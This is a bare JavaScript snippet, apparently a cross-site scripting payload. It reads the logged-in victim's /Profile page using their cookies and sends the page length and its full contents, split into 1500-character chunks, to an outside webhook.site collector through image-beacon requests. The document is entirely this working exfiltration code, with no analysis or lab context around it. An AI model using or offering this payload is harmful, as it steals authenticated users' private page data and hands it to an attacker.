fetch('/Profile',{credentials:'include'})
  .then(r=>r.text())
  .then(d=>{
    new Image().src='https://webhook.site/dbffcd4a-59b3-4a3b-8de2-453266989ae4?len='+d.length;
    for(let i=0;i<d.length;i+=1500){
      new Image().src='https://webhook.site/dbffcd4a-59b3-4a3b-8de2-453266989ae4?part='+i+'&d='+encodeURIComponent(d.substring(i,i+1500));
    }
  })